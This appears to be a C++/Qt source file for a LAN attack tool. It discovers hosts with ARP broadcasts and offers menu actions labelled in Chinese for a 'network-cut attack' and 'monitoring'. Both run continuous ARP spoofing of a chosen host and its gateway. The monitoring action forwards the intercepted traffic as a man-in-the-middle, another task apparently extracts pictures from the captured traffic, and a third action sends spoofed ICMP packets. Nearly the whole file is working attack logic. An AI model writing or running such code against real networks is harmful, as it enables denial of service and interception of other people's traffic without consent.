#include "my_tool.h"
#include "iostream"
//#include "cxcore.h"
//#include "opencv2\opencv.hpp"
//#include "opencv2\highgui\highgui.hpp"
#include <stdio.h>
#include "Module/CapManager.h"
#include <QTableWidgetItem>
#pragma execution_character_set("utf-8")
//using namespace std;
//using namespace cv;
#define IPTOSBUFFERS    12

static my_tool *mToolUi=nullptr;
my_tool::my_tool(QWidget *parent)
	: QMainWindow(parent)
{
	ui.setupUi(this);
	ui.tableWidget->setSelectionBehavior(QAbstractItemView::SelectRows);
	setsolt();
	mCurrentStatus = unopen;
	CapManager::instance()->init();
	CapManager::instance()->addcallback(my_tool::receiveData,this);
	PackingManager::instance()->init();
	AnalysisManager::instance()->init();
	init();
	//mPackInstallWorker = new PackInstallWorker();
	//connect(mReceiveWorker, SIGNAL(receivedata(QString)), this, SLOT(Getdata(QString)));
}

my_tool::~my_tool()
{

}

my_tool* my_tool::instance()
{
	if (mToolUi==nullptr)
	{
		mToolUi = new my_tool();
	}
	return mToolUi;
}


void my_tool::init()
{
	QStringList *mWangKaHash = CapManager::instance()->GetWangKaNameList();
	QListIterator<QString>index(*mWangKaHash);
	while (index.hasNext())
	{
		QString name =index.next();
		ui.wangkaBox->addItem(name);
	}
	if (mWangKaHash)
	{
		delete mWangKaHash;
	}
	mMenu = new QMenu(ui.tableWidget);
	mStopNetAction = new QAction("断网攻击", ui.tableWidget);
	mMonitorAction = new QAction("监听",ui.tableWidget);
	mStopAction = new QAction("停止", ui.tableWidget);
	mIcmpAction = new QAction("Ping",ui.tableWidget);
	mMenu->addAction(mStopNetAction);
	mMenu->addAction(mMonitorAction);
	mMenu->addAction(mStopAction);
	mMenu->addAction(mIcmpAction);
	connect(mStopNetAction, SIGNAL(triggered()), this, SLOT(stopNetActionSlot()));
	connect(mMonitorAction, SIGNAL(triggered()), this, SLOT(mOnitorActionSlot()));
	connect(mStopAction, SIGNAL(triggered()), this, SLOT(mStopActionSlot()));
	connect(mIcmpAction, SIGNAL(triggered()), this, SLOT(mIcmpActionSlot()));
}


void my_tool::on_OpenWangKaButton_clicked()
{
	switch (mCurrentStatus)
	{
	case unopen:
		if (CapManager::instance()->open(ui.wangkaBox->currentText()))
		{
			ui.wangkaBox->setDisabled(true);
			mCurrentStatus = opening;
		}
		break;
	case opening:
		break;
	case stop:
		break;
	default:
		break;
	}


}

void my_tool::ShowCamera()
{
	
	//VideoCapture  capture(0);
	//CvCapture* capture = cvCreateFileCapture("I:\\123.mp4");
	//CvCapture* capture = cvCreateCameraCapture(0);
	//cv::VideoCapture cap(0);
	//if (!cap.isOpened())
	//{
	//	return ;
	//}
	//Mat frame;
	//Mat edges;
	//while (1) {
	///*	frame = cvQueryFrame(capture);*/
	//	/*if (!frame) 
	//	{
	//		break;
	//	}
	//	else
	//	{*/
	//	/*	char *ccc = {};
	//		cvShowImage("win", frame);
	//		QString filename = QString("C:\\Picture\\%1.jpg").arg(a++);
	//		QByteArray bbb = filename.toLatin1();
	//		ccc = bbb.data();
	//		cvSaveImage(ccc, frame); */
	///*	}*/
	//	cap >> frame;
	//	//cvtColor(frame, edges, CV_BGR2GRAY);
	//	//GaussianBlur(edges, edges, Size(7, 7), 1.5, 1.5);
	//	//Canny(edges, edges, 0, 30, 3);
	//	namedWindow("camera", CV_WINDOW_NORMAL);
	//	imshow("camera", frame);

	//
	//	char c = cvWaitKey(50);
	//	if (c == 27) break;
	//}
}

void my_tool::setsolt()
{
	QObject::connect(ui.sniffStartButton, SIGNAL(clicked()), this, SLOT(sniff()));
	QObject::connect(ui.OpenCameraButtom, SIGNAL(clicked()), this, SLOT(ShowCamera()));
	//QObject::connect(ui.FinishButton, SIGNAL(clicked()), this, SLOT(FinishSniff()));
}

void my_tool::addItemContent(int row, int column, QString content)
{
	QTableWidgetItem *item = new QTableWidgetItem(content);	      
	tableMutex.lock();
	ui.tableWidget->setItem(row, column, item);
	tableMutex.unlock();
}




void my_tool::receiveData(QByteArray &data, void *pr)
{
	my_tool *tool = (my_tool*)pr;
	if (tool)
	{
		//qDebug() << data.toHex();
	//	QString receivedata = data.toHex();
	//	tool->ui.textEdit->append(receivedata);
	}
}
void my_tool::showarpdev(void *pr, void *data)
{


	////这个与的操作不太懂

	my_tool *tool = (my_tool*)pr;
	deviceInfo *info = (deviceInfo*)data;
	if (tool&&info)
	{
		QString strip = QString::number(info->IP.at(0) & 0xff, 10) + "." +
			QString::number(info->IP.at(1) & 0xff, 10) + "." +
			QString::number(info->IP.at(2) & 0xff, 10) + "." +
			QString::number(info->IP.at(3) & 0xff, 10);
		QString strmac = QString::number(info->MAC.at(0) & 0xff, 16) + ":" +
			QString::number(info->MAC.at(1) & 0xff, 16) + ":" +
			QString::number(info->MAC.at(2) & 0xff, 16) + ":" +
			QString::number(info->MAC.at(3) & 0xff, 16) + ":" +
			QString::number(info->MAC.at(4) & 0xff, 16) + ":" +
			QString::number(info->MAC.at(5) & 0xff, 16);
		tool->devInfoMutex.lock();
		if (!tool->devInfoHash.contains(strip))
		{
			info->strIp = strip;
			info->strMac = strmac;
			tool->devInfoHash.insert(strip, info);
			tool->devInfoMutex.unlock();
			tool->tableMutex.lock();
			int rowIndex = tool->ui.tableWidget->rowCount();
			tool->ui.tableWidget->setRowCount(rowIndex + 1);
			tool->tableMutex.unlock();
			tool->addItemContent(rowIndex, 0, strip);
			tool->addItemContent(rowIndex, 1, strmac);
		}
		else
		{
			delete info;
			tool->devInfoMutex.unlock();
		}
	}
}
void my_tool::on_sniffStartButton_clicked()
{
	devInfoMutex.lock();
	devInfoHash.clear();

	devInfoMutex.unlock();
	tableMutex.lock();
	ui.tableWidget->setRowCount(0);
	tableMutex.unlock();
	arppack *pack = new arppack();
	pack->disMac = QString("FF:FF:FF:FF:FF:FF");;
	pack->surMac = CapManager::instance()->getCurrentWangkaMac();
	pack->sendMac = CapManager::instance()->getCurrentWangkaMac();
	pack->sendIp = CapManager::instance()->getCurrentWangkaIp();
	pack->targetMac = QString("00:00:00:00:00:00");
	pack->type = 1;
	packingnfo *packinfo=new packingnfo();
	packinfo->call = PackingManager::packArpBroadcast;
	packinfo->isRunOneTime = true;
	packinfo->parameter = pack;
	packinfo->pr = PackingManager::instance();
	packinfo->name = ARP_Broadcast;
	PackingManager::instance()->addPackTask(packinfo);

	AnalysisInfo *anaInfo = new AnalysisInfo();
	anaInfo->doAnaly = AnalysisManager::AnalysisArp;
	anaInfo->isRunOneTime = false;
	anaInfo->anaPr = AnalysisManager::instance();
	anaInfo->call = my_tool::showarpdev;
	anaInfo->callpr = this;
	anaInfo->name = ARP_GET_DEV;
	AnalysisManager::instance()->addAnaTask(anaInfo);
}

void my_tool::Getdata(QString data)
{
	ui.textEdit->append(data);
}

void my_tool::ifprint(pcap_if_t *d)
{
	pcap_addr_t *a;
	char ip6str[128];

	/* 设备名(Name) */
	printf("%s\n", d->name);

	/* 设备描述(Description) */
	if (d->description)
		printf("\tDescription: %s\n", d->description);

	/* Loopback Address*/
	printf("\tLoopback: %s\n", (d->flags & PCAP_IF_LOOPBACK) ? "yes" : "no");

	/* IP addresses */
	for (a = d->addresses; a; a = a->next) {
		printf("\tAddress Family: #%d\n", a->addr->sa_family);

		switch (a->addr->sa_family)
		{
		case AF_INET:
			printf("\tAddress Family Name: AF_INET\n");
			if (a->addr)

			//	printf("\tAddress: %s\n", iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr));
			qDebug() << "tAddress::" << QString::fromLocal8Bit(iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr));
			if (a->netmask)
			//	printf("\tNetmask: %s\n", iptos(((struct sockaddr_in *)a->netmask)->sin_addr.s_addr));
			qDebug() << "tNetmask::" << QString::fromLocal8Bit(iptos(((struct sockaddr_in *)a->netmask)->sin_addr.s_addr));
			if (a->broadaddr)
				//printf("\tBroadcast Address: %s\n", iptos(((struct sockaddr_in *)a->broadaddr)->sin_addr.s_addr));
				qDebug() << "tBroadcast Address::" << QString::fromLocal8Bit(iptos(((struct sockaddr_in *)a->broadaddr)->sin_addr.s_addr));
			if (a->dstaddr)
				//printf("\tDestination Address: %s\n", iptos(((struct sockaddr_in *)a->dstaddr)->sin_addr.s_addr));
				qDebug() << "tDestination Address::" << QString::fromLocal8Bit(iptos(((struct sockaddr_in *)a->dstaddr)->sin_addr.s_addr));
			break;

		case AF_INET6:
			printf("\tAddress Family Name: AF_INET6\n");
			if (a->addr)
				printf("\tAddress: %s\n", ip6tos(a->addr, ip6str, sizeof(ip6str)));
			break;

		default:
			printf("\tAddress Family Name: Unknown\n");
			break;
		}
	}
	printf("\n");
}


/* 将数字类型的IP地址转换成字符串类型的 */
#define IPTOSBUFFERS    12
char *my_tool::iptos(u_long in)
{
	static char output[IPTOSBUFFERS][3 * 4 + 3 + 1];
	static short which;
	u_char *p;

	p = (u_char *)&in;
	which = (which + 1 == IPTOSBUFFERS ? 0 : which + 1);
	sprintf(output[which], "%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
	return output[which];
}

char* my_tool::ip6tos(struct sockaddr *sockaddr, char *address, int addrlen)
{
	socklen_t sockaddrlen;

#ifdef WIN32
	sockaddrlen = sizeof(struct sockaddr_in6);
#else
	sockaddrlen = sizeof(struct sockaddr_storage);
#endif


	if (getnameinfo(sockaddr,
		sockaddrlen,
		address,
		addrlen,
		NULL,
		0,
		NI_NUMERICHOST) != 0) address = NULL;

	return address;
}

void my_tool::contextMenuEvent(QContextMenuEvent *event)
{

	mMenu->exec(QCursor::pos());
	
}


QString my_tool::getWangKaGateway(QString ip)
{
	deviceInfo *info = devInfoHash.value(ip);
	if (info)
	{
		return info->strMac;
	}
	return "";
}

void my_tool::stopNetActionSlot()
{
	int row = ui.tableWidget->currentRow();
	tableMutex.lock();
	QTableWidgetItem *item = ui.tableWidget->item(row,0);
	tableMutex.unlock();
	if (item)
	{
		QString ip = item->text();
		arppack *pack = new arppack();
		pack->disMac = devInfoHash.value(ip)->strMac;
		pack->surMac = CapManager::instance()->getCurrentWangkaMac();
		pack->sendMac = CapManager::instance()->getCurrentWangkaMac();
		pack->sendIp = CapManager::instance()->getCurrentWangkaGateway();
		pack->targetMac = devInfoHash.value(ip)->strMac;
		pack->targetIp = ip;
		pack->type = 2;
		packingnfo *packinfo = new packingnfo();
		packinfo->call = PackingManager::packArpClient;
		packinfo->isRunOneTime = false;
		packinfo->parameter = pack;
		packinfo->pr = PackingManager::instance();
		packinfo->name = ip + ARP_Client + STOP_NET;
		PackingManager::instance()->addPackTask(packinfo);
	}
	mMenu->hide();
}

void my_tool::mOnitorActionSlot()
{
	int row = ui.tableWidget->currentRow();
	tableMutex.lock();
	QTableWidgetItem *item = ui.tableWidget->item(row, 0);
	tableMutex.unlock();
	if (item)
	{
		QString ip = item->text();
		arppack *devpack = new arppack();
		devpack->disMac = devInfoHash.value(ip)->strMac;
		//devpack->disMac ="FF:FF:FF:FF:FF:FF";
		devpack->surMac = CapManager::instance()->getCurrentWangkaMac();
		devpack->sendMac = CapManager::instance()->getCurrentWangkaMac();
		devpack->sendIp = CapManager::instance()->getCurrentWangkaGateway();
		devpack->targetMac = devInfoHash.value(ip)->strMac;
		devpack->targetIp = ip;
		devpack->type = 2;
		packingnfo *devpackinfo = new packingnfo();
		devpackinfo->call = PackingManager::packArpClient;
		devpackinfo->isRunOneTime = false;
		devpackinfo->parameter = devpack;
		devpackinfo->pr = PackingManager::instance();
		devpackinfo->name = ip + ARP_Client + Deception + DEV;
		PackingManager::instance()->addPackTask(devpackinfo);

		arppack *devpack1 = new arppack();
		devpack1->disMac = devInfoHash.value(ip)->strMac;
		devpack1->surMac = getWangKaGateway(CapManager::instance()->getCurrentWangkaGateway());
		devpack1->sendMac = getWangKaGateway(CapManager::instance()->getCurrentWangkaGateway());
		devpack1->sendIp = CapManager::instance()->getCurrentWangkaIp();
		devpack1->targetMac = devInfoHash.value(ip)->strMac;
		devpack1->targetIp = ip;
		devpack1->type = 2;
		packingnfo *devpackinfo1 = new packingnfo();
		devpackinfo1->call = PackingManager::packArpClient;
		devpackinfo1->isRunOneTime = false;
		devpackinfo1->parameter = devpack1;
		devpackinfo1->pr = PackingManager::instance();
		devpackinfo1->name = ip + ARP_Client + Deception + DEV+"2";
		//PackingManager::instance()->addPackTask(devpackinfo1);

		arppack *Gatewaypack = new arppack();
		QString gatewayMac = getWangKaGateway(CapManager::instance()->getCurrentWangkaGateway());
		Gatewaypack->disMac = gatewayMac;
		Gatewaypack->surMac = CapManager::instance()->getCurrentWangkaMac();
		Gatewaypack->sendMac = CapManager::instance()->getCurrentWangkaMac();
		Gatewaypack->sendIp = ip;
		Gatewaypack->targetMac = gatewayMac;
		Gatewaypack->targetIp = CapManager::instance()->getCurrentWangkaGateway();
		Gatewaypack->type = 2;
		packingnfo *Gatewaypackinfo = new packingnfo();
		Gatewaypackinfo->call = PackingManager::packArpClient;
		Gatewaypackinfo->isRunOneTime = false;
		Gatewaypackinfo->parameter = Gatewaypack;
		Gatewaypackinfo->pr = PackingManager::instance();
		Gatewaypackinfo->name = ip + ARP_Client + Deception + GATEWAY;
		PackingManager::instance()->addPackTask(Gatewaypackinfo);


		arppack *Gatewaypack1 = new arppack();
	//	QString gatewayMac = getWangKaGateway(CapManager::instance()->getCurrentWangkaGateway());
		Gatewaypack1->disMac = gatewayMac;
		Gatewaypack1->surMac = devInfoHash.value(ip)->strMac;;
		Gatewaypack1->sendMac = devInfoHash.value(ip)->strMac;;
		Gatewaypack1->sendIp = CapManager::instance()->getCurrentWangkaIp();
		Gatewaypack1->targetMac = gatewayMac;
		Gatewaypack1->targetIp = CapManager::instance()->getCurrentWangkaGateway();
		Gatewaypack1->type = 2;
		packingnfo *Gatewaypackinfo1 = new packingnfo();
		Gatewaypackinfo1->call = PackingManager::packArpClient;
		Gatewaypackinfo1->isRunOneTime = false;
		Gatewaypackinfo1->parameter = Gatewaypack1;
		Gatewaypackinfo1->pr = PackingManager::instance();
		Gatewaypackinfo1->name = ip + ARP_Client + Deception + GATEWAY+"2";
	//	PackingManager::instance()->addPackTask(Gatewaypackinfo1);



		QByteArray mIP;
		QByteArray gatewayArray;
		CapManager::macStrToByte(gatewayArray, gatewayMac);
		QByteArray mMacArray;
		CapManager::macStrToByte(mMacArray, CapManager::instance()->getCurrentWangkaMac());

		CapManager::ipStrToByte(mIP, CapManager::instance()->getCurrentWangkaIp());

		transmitInfo *traninfo = new transmitInfo();
		traninfo->devMac = devInfoHash.value(ip)->MAC;
		traninfo->devIP = devInfoHash.value(ip)->IP;
		traninfo->gatewayMac = gatewayArray;
		traninfo->mMac = mMacArray;
		traninfo->mIP = mIP;


		AnalysisInfo *anaInfo = new AnalysisInfo();
		anaInfo->doAnaly = AnalysisManager::monitorAndTransmit;
		anaInfo->isRunOneTime = false;
		anaInfo->anaPr = AnalysisManager::instance();
		anaInfo->anaParameter = traninfo;
		//anaInfo->call = my_tool::showarpdev;
	//	anaInfo->callpr = this;
		anaInfo->name = ip+ARP_TRANSMIT;
		AnalysisManager::instance()->addAnaTask(anaInfo);


	}
	mMenu->hide();
}

void my_tool::mIcmpActionSlot()
{
	int row = ui.tableWidget->currentRow();
	tableMutex.lock();
	QTableWidgetItem *item = ui.tableWidget->item(row, 0);
	tableMutex.unlock();
	if (item)
	{
		QString ip = item->text();
		icmppack *pack = new icmppack();
		//pack->disMac = devInfoHash.value(ip)->strMac;
		//pack->surMac = CapManager::instance()->getCurrentWangkaMac();
		//pack->sendIp = CapManager::instance()->getCurrentWangkaIp();
		//pack->targetIp = ip;
		pack->disMac = getWangKaGateway(CapManager::instance()->getCurrentWangkaGateway());
		pack->surMac = devInfoHash.value(ip)->strMac;
		pack->sendIp = ip;
		pack->targetIp = CapManager::instance()->getCurrentWangkaGateway();
		packingnfo *packinfo = new packingnfo();
		packinfo->call = PackingManager::packIcmp;
		packinfo->isRunOneTime = false;
		packinfo->parameter = pack;
		packinfo->pr = PackingManager::instance();
		packinfo->name = ip + ICMP;
		PackingManager::instance()->addPackTask(packinfo);
	}
	mMenu->hide();
}


void my_tool::on_cutOutPicButton_clicked()
{
	AnalysisInfo *anaInfo = new AnalysisInfo();
	anaInfo->doAnaly = AnalysisManager::cutOutPic;
	anaInfo->isRunOneTime = false;
	anaInfo->anaPr = AnalysisManager::instance();
	anaInfo->anaParameter = nullptr;
	//anaInfo->call = my_tool::showarpdev;
	//	anaInfo->callpr = this;
	anaInfo->name = CUT_OUT_PIC;
	AnalysisManager::instance()->addAnaTask(anaInfo);
}



void my_tool::mStopActionSlot()
{
	int row = ui.tableWidget->currentRow();
	tableMutex.lock();
	QTableWidgetItem *item = ui.tableWidget->item(row, 0);
	tableMutex.unlock();
	if (item)
	{
		QString ip = item->text();
		PackingManager::instance()->deletePackTask(ip + ARP_Client + STOP_NET);
		PackingManager::instance()->deletePackTask(ip + ARP_Client + Deception + DEV);
		PackingManager::instance()->deletePackTask(ip + ARP_Client + Deception + GATEWAY);
		PackingManager::instance()->deletePackTask(ip + ICMP );
		AnalysisManager::instance()->deleteAnaTask(ip + ARP_TRANSMIT);

	}
	mMenu->hide();
}






